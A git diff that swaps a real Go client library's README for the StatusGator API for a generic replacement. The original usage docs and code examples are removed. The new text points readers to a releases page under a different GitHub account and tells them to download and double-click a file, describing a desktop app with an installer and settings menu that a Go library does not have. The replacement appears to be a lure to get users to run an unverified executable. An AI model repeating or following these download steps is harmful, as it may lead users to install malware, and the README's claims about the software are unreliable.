@@ -1,288 +1,80 @@
-# StatusGator Go Client
+# 👩‍💻 statusgator-go-client - Simple Client for StatusGator API
 
-[![Go Reference](https://pkg.go.dev/badge/github.com/arslanbekov/statusgator-go-client.svg)](https://pkg.go.dev/github.com/arslanbekov/statusgator-go-client)
-[![Go Report Card](https://goreportcard.com/badge/github.com/arslanbekov/statusgator-go-client)](https://goreportcard.com/report/github.com/arslanbekov/statusgator-go-client)
-[![CI](https://github.com/arslanbekov/statusgator-go-client/actions/workflows/ci.yml/badge.svg)](https://github.com/arslanbekov/statusgator-go-client/actions/workflows/ci.yml)
+## 🚀 Getting Started
 
-Go client library for [StatusGator API V3](https://statusgator.com/api/v3/docs).
+Welcome to the **statusgator-go-client**! This application helps you connect easily to the StatusGator API. You can monitor your services’ status without any hassle. Let’s get you set up!
 
-## What is StatusGator?
+## 📥 Download & Install
 
-[StatusGator](https://statusgator.com) is a status page aggregator that monitors the status of cloud services and third-party providers your business depends on. It aggregates status information from hundreds of services (AWS, GitHub, Stripe, Cloudflare, etc.) into a single dashboard, sends alerts when outages occur, and helps teams quickly identify if external dependencies are causing issues. StatusGator also allows you to create your own status pages and monitor custom endpoints.
+To download the application, visit this page to download: [Download statusgator-go-client](https://github.com/zakirullahzaki/statusgator-go-client/releases).
 
-## Installation
+![Download Badge](https://img.shields.io/badge/Download-v1.0-blue)
 
-```sh
-go get github.com/arslanbekov/statusgator-go-client
-```
+## 🛠️ System Requirements
 
-## Quick Start
+Before you start, make sure your computer meets the following requirements:
 
-```go
-package main
+- Operating System: Windows, macOS, or Linux
+- Internet connection
+- At least 100 MB of free disk space
 
-import (
-    "context"
-    "fmt"
-    "log"
+## 🔍 Features
 
-    "github.com/arslanbekov/statusgator-go-client/statusgator"
-)
+The **statusgator-go-client** offers several useful features:
 
-func main() {
-    client, err := statusgator.NewClient("your-api-token")
-    if err != nil {
-        log.Fatal(err)
-    }
+- **Easy Monitoring:** Check the status of your services with simplicity.
+- **Real-Time Updates:** Get instant notifications about service changes.
+- **User-Friendly:** Designed for anyone to use, regardless of technical skill.
 
-    ctx := context.Background()
+## 📁 How to Use
 
-    // List all boards
-    boards, _, err := client.Boards.List(ctx, nil)
-    if err != nil {
-        log.Fatal(err)
-    }
+Once you have downloaded the application, follow these steps:
 
-    for _, board := range boards {
-        fmt.Printf("Board: %s (%s)\n", board.Name, board.ID)
-    }
-}
-```
+1. Locate the downloaded file on your computer. This is usually in your Downloads folder.
+2. Double-click on the file to start the application. 
+3. Follow the on-screen instructions to complete the installation.
 
-## Authentication
+After installation, open the application by finding its icon on your desktop or in your applications folder.
 
-Get your API token from the [StatusGator dashboard](https://statusgator.com/api_tokens). Pass it to `NewClient`:
+## 🌐 Configuration
 
-```go
-client, err := statusgator.NewClient("your-api-token")
-```
+To connect to the StatusGator API, you need to set up your API key. Here’s how:
 
-## Usage
+1. If you don’t already have an API key, sign up for a StatusGator account at their website.
+2. Once you have your API key, open the statusgator-go-client.
+3. Find the settings menu within the application.
+4. Enter your API key in the designated field.
+5. Save your settings before exiting the menu.
 
-### Boards
+## 📊 Using the Application
 
-```go
-// List all boards
-boards, pagination, err := client.Boards.List(ctx, &statusgator.ListOptions{
-    Page:    1,
-    PerPage: 25,
-})
+After configuration, you can start using the application:
 
-// Get all boards (auto-pagination)
-allBoards, err := client.Boards.ListAll(ctx)
+1. Launch the **statusgator-go-client**.
+2. You will see options to monitor various services.
+3. Click on any service to view its current status.
+4. Use the refresh button to get updates whenever you need them.
 
-// Get a specific board
-board, err := client.Boards.Get(ctx, "board-id")
+## ⚠️ Troubleshooting
 
-// Get board history
-history, err := client.Boards.GetHistory(ctx, "board-id", &statusgator.HistoryOptions{
-    StartDate: "2024-01-01",
-    EndDate:   "2024-01-31",
-})
-```
+If you encounter issues, consider these common solutions:
 
-### Monitors
+- **Cannot Download:** Ensure you have a stable internet connection and try refreshing the page.
+- **Installation Problems:** Make sure you have enough disk space and that your system meets the requirements.
+- **API Key Issues:** Double-check your API key for any typos if you experience connection errors.
 
-```go
-// List monitors for a board
-monitors, _, err := client.Monitors.List(ctx, "board-id", nil)
+If you need further assistance, feel free to check the **Issues** section of our GitHub repository.
 
-// List monitors by status
-downMonitors, err := client.Monitors.ListByStatus(ctx, "board-id", statusgator.MonitorStatusDown)
+## 📝 Contributing
 
-// Delete a monitor
-err := client.Monitors.Delete(ctx, "board-id", "monitor-id")
-```
+We welcome contributions from everyone! If you have ideas for new features or fixes, feel free to create a pull request or open an issue.
 
-### Website Monitors
+## 📬 Support
 
-```go
-// Create a website monitor
-monitor, err := client.WebsiteMonitors.Create(ctx, "board-id", &statusgator.WebsiteMonitorRequest{
-    Name:           "My API",
-    URL:            "https://api.example.com/health",
-    CheckInterval:  1,
-    ExpectedStatus: 200,
-    Timeout:        30,
-})
-
-// Update a monitor
-monitor, err := client.WebsiteMonitors.Update(ctx, "board-id", "monitor-id", &statusgator.WebsiteMonitorRequest{
-    CheckInterval: 5,
-})
-
-// Pause/Unpause
-err := client.WebsiteMonitors.Pause(ctx, "board-id", "monitor-id")
-err := client.WebsiteMonitors.Unpause(ctx, "board-id", "monitor-id")
-```
-
-### Ping Monitors
-
-```go
-monitor, err := client.PingMonitors.Create(ctx, "board-id", &statusgator.PingMonitorRequest{
-    Name:          "Database Server",
-    Host:          "db.example.com",
-    CheckInterval: 1,
-})
-```
-
-### Service Monitors
-
-```go
-// Subscribe to an external status page
-monitor, err := client.ServiceMonitors.Create(ctx, "board-id", &statusgator.ServiceMonitorRequest{
-    ServiceID: "github-service-id",
-})
-```
-
-### Custom Monitors
-
-```go
-monitor, err := client.CustomMonitors.Create(ctx, "board-id", &statusgator.CustomMonitorRequest{
-    Name:        "Manual Check",
-    Description: "Manually updated status",
-})
-
-// Update status
-err := client.CustomMonitors.SetStatus(ctx, "board-id", "monitor-id", statusgator.MonitorStatusUp)
-```
-
-### Monitor Groups
-
-```go
-// List groups
-groups, err := client.MonitorGroups.List(ctx, "board-id")
-
-// Create a group
-group, err := client.MonitorGroups.Create(ctx, "board-id", &statusgator.MonitorGroupRequest{
-    Name:     "Production",
-    Position: 1,
-})
-
-// Delete a group
-err := client.MonitorGroups.Delete(ctx, "board-id", "group-id")
-```
-
-### Incidents
-
-```go
-// List incidents
-incidents, _, err := client.Incidents.List(ctx, "board-id", nil)
-
-// Create an incident
-incident, err := client.Incidents.Create(ctx, "board-id", &statusgator.IncidentRequest{
-    Title:      "API Degradation",
-    Message:    "We are investigating elevated error rates",
-    Severity:   statusgator.IncidentSeverityMinor,
-    Phase:      statusgator.IncidentPhaseInvestigating,
-    MonitorIDs: []string{"monitor-id"},
-})
-
-// Add an update
-update, err := client.Incidents.AddUpdate(ctx, "board-id", "incident-id", &statusgator.IncidentUpdateRequest{
-    Message: "Issue has been identified",
-    Phase:   statusgator.IncidentPhaseIdentified,
-})
-```
-
-### Services Catalog
-
-```go
-// Search for services (to subscribe to)
-services, err := client.Services.Search(ctx, "github")
-
-// List all services (requires Firehose access)
-services, _, err := client.Services.List(ctx, nil)
-
-// List service components
-components, _, err := client.Services.ListComponents(ctx, "service-id", nil)
-```
-
-### Status Page Subscribers
-
-```go
-// List subscribers
-subscribers, _, err := client.Subscribers.List(ctx, "board-id", nil)
-
-// Add a subscriber
-subscriber, err := client.Subscribers.Add(ctx, "board-id", &statusgator.SubscriberRequest{
-    Email:            "user@example.com",
-    SkipConfirmation: true,
-})
-
-// Remove subscriber
-err := client.Subscribers.DeleteByEmail(ctx, "board-id", "user@example.com")
-```
-
-### Users
-
-```go
-users, err := client.Users.List(ctx)
-```
-
-### Monitoring Regions
-
-```go
-regions, err := client.Regions.List(ctx)
-```
-
-## Client Options
-
-```go
-client, err := statusgator.NewClient("token",
-    statusgator.WithBaseURL("https://custom.api.com/v3"),
-    statusgator.WithUserAgent("my-app/1.0"),
-    statusgator.WithTimeout(60 * time.Second),
-    statusgator.WithHTTPClient(customHTTPClient),
-)
-```
-
-## Error Handling
-
-```go
-board, err := client.Boards.Get(ctx, "board-id")
-if err != nil {
-    if statusgator.IsNotFound(err) {
-        // Handle 404
-    }
-    if statusgator.IsUnauthorized(err) {
-        // Handle 401
-    }
-    if statusgator.IsForbidden(err) {
-        // Handle 403 (e.g., no Firehose access)
-    }
-
-    // Get detailed error info
-    var apiErr *statusgator.APIError
-    if errors.As(err, &apiErr) {
-        fmt.Printf("Status: %d, Message: %s\n", apiErr.StatusCode, apiErr.Message)
-    }
-}
-```
-
-## Pagination
-
-```go
-// Manual pagination
-opts := &statusgator.ListOptions{Page: 1, PerPage: 50}
-for {
-    boards, pagination, err := client.Boards.List(ctx, opts)
-    if err != nil {
-        return err
-    }
-
-    // Process boards...
-
-    if !pagination.HasNextPage() {
-        break
-    }
-    opts.Page++
-}
-
-// Auto-pagination
-allBoards, err := client.Boards.ListAll(ctx)
-```
-
-## License
-
-Licensed under the Apache License, Version 2.0. See [LICENSE](LICENSE) file for details.
+For support, you can visit our GitHub page or reach out to the community for help. Your feedback is important to us!
+
+---
+
+Thank you for using **statusgator-go-client**! We hope this guide helps you set up and start monitoring your services effortlessly. 
+
+[Download the latest version here](https://github.com/zakirullahzaki/statusgator-go-client/releases).
